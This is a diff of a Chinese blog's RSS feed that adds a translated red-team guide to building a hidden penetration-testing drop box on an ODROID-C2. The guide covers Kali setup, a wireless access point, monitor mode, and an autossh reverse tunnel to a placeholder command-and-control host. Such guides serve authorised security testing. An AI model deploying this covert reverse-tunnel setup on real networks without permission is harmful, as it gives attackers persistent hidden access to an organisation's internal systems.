@@ -7,7 +7,145 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Sat, 02 Aug 2025 09:07:14 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E7%A1%AC%E4%BB%B6%E9%BB%91%E5%AE%A2/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 07 Aug 2025 19:08:11 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E7%A1%AC%E4%BB%B6%E9%BB%91%E5%AE%A2/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>如何构建自己的渗透测试投放设备 - ODROID-C2实战指南</title>
+        <link>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%95%E6%94%BE%E8%AE%BE%E5%A4%87-odroid-c2%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/</link>
+        <pubDate>Thu, 07 Aug 2025 19:08:11 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%95%E6%94%BE%E8%AE%BE%E5%A4%87-odroid-c2%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/</guid>
+        <description>&lt;h1 id=&#34;如何构建自己的渗透测试投放设备&#34;&gt;如何构建自己的渗透测试投放设备
+&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;作者&lt;/strong&gt;：Beau Bullock // 红队工具专家&lt;/p&gt;
+&lt;h2 id=&#34;摘要&#34;&gt;摘要
+&lt;/h2&gt;&lt;p&gt;本文对比测试了三款单板计算机（SBC）作为&amp;quot;渗透测试投放设备&amp;quot;的性能表现，重点推荐Hardkernel公司的ODROID-C2方案。完整构建指南包含硬件组装、Kali Linux系统配置、无线接入点搭建和持久化SSH隧道等技术细节，总成本控制在110美元左右。&lt;/p&gt;
+&lt;h2 id=&#34;设备需求分析&#34;&gt;设备需求分析
+&lt;/h2&gt;&lt;p&gt;在零售企业红队演练中，作者需要满足以下核心需求：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;隐蔽物理尺寸（可藏于办公桌下）&lt;/li&gt;
+&lt;li&gt;支持无线控制（最好能多网卡并发）&lt;/li&gt;
+&lt;li&gt;持久化SSH反向隧道&lt;/li&gt;
+&lt;li&gt;完整渗透测试OS环境（非单纯跳板）&lt;/li&gt;
+&lt;li&gt;32-64GB存储空间&lt;/li&gt;
+&lt;li&gt;硬件性能满足实战需求&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;硬件对比测试&#34;&gt;硬件对比测试
+&lt;/h2&gt;&lt;p&gt;测试机型及关键参数：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;规格&lt;/th&gt;
+          &lt;th&gt;Raspberry Pi 3&lt;/th&gt;
+          &lt;th&gt;BeagleBone Black&lt;/th&gt;
+          &lt;th&gt;ODROID-C2&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;处理器&lt;/td&gt;
+          &lt;td&gt;1.2GHz四核Cortex-A53&lt;/td&gt;
+          &lt;td&gt;1GHz Cortex-A8&lt;/td&gt;
+          &lt;td&gt;2GHz四核Cortex-A53&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;内存&lt;/td&gt;
+          &lt;td&gt;1GB LPDDR2&lt;/td&gt;
+          &lt;td&gt;512MB DDR3&lt;/td&gt;
+          &lt;td&gt;2GB DDR3&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;存储&lt;/td&gt;
+          &lt;td&gt;microSD&lt;/td&gt;
+          &lt;td&gt;4GB eMMC + microSD&lt;/td&gt;
+          &lt;td&gt;eMMC/microSD&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;网络&lt;/td&gt;
+          &lt;td&gt;10/100Mbps + WiFi&lt;/td&gt;
+          &lt;td&gt;10/100Mbps&lt;/td&gt;
+          &lt;td&gt;千兆以太网&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;性能测试结果&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;启动速度：ODROID-C2比树莓派3快1分钟，比BeagleBone快2分钟&lt;/li&gt;
+&lt;li&gt;磁盘读写：eMMC模块的ODROID-C2比microSD方案快15倍&lt;/li&gt;
+&lt;li&gt;密码破解：John the Ripper基准测试ODROID-C2显著领先&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;系统配置详解&#34;&gt;系统配置详解
+&lt;/h2&gt;&lt;h3 id=&#34;kali-linux安装&#34;&gt;Kali Linux安装
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;下载官方ARM镜像&lt;/li&gt;
+&lt;li&gt;使用Win32DiskImager或dd命令写入eMMC&lt;/li&gt;
+&lt;li&gt;解决已知启动问题：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mount /dev/mmcblk0p1 /boot
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/dev/mmcblk0p1 /boot auto defaults 0 0&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /etc/fstab
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;无线接入点配置&#34;&gt;无线接入点配置
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install hostapd dnsmasq
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nano /etc/hostapd/hostapd.conf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;配置文件示例：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;interface&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;wlan0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ssid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;pentest_ap&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;channel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;wpa_passphrase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;securepassword&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;wpa_key_mgmt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;WPA-PSK&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;持久化ssh隧道&#34;&gt;持久化SSH隧道
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;autossh -M &lt;span class=&#34;m&#34;&gt;11166&lt;/span&gt; -N -f -o &lt;span class=&#34;s2&#34;&gt;&amp;#34;PubkeyAuthentication=yes&amp;#34;&lt;/span&gt; -i /root/.ssh/id_rsa -R 6667:localhost:22 root@C2_IP
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;实战部署经验&#34;&gt;实战部署经验
+&lt;/h2&gt;&lt;p&gt;在真实红队行动中，该设备成功：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过无线接口绕过DHCP限制&lt;/li&gt;
+&lt;li&gt;维持3天稳定SSH隧道&lt;/li&gt;
+&lt;li&gt;并发处理多个Meterpreter会话&lt;/li&gt;
+&lt;li&gt;执行网络扫描和漏洞利用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;完整配件清单&#34;&gt;完整配件清单
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;ODROID-C2主板 $41.95&lt;/li&gt;
+&lt;li&gt;32GB eMMC模块 $42.95&lt;/li&gt;
+&lt;li&gt;RT5370芯片无线网卡 $11.99&lt;/li&gt;
+&lt;li&gt;带风扇外壳 $9.99&lt;/li&gt;
+&lt;li&gt;电源适配器 $6.99&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;特别提示：部署时建议准备备用无线网卡用于攻击模式切换（&lt;code&gt;airmon-ng start wlan1&lt;/code&gt;）&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
         <title>RFID近场克隆攻击技术深度解析</title>
         <link>http://localhost:1313/p/rfid%E8%BF%91%E5%9C%BA%E5%85%8B%E9%9A%86%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</link>
         <pubDate>Sat, 02 Aug 2025 09:07:14 +0800</pubDate>
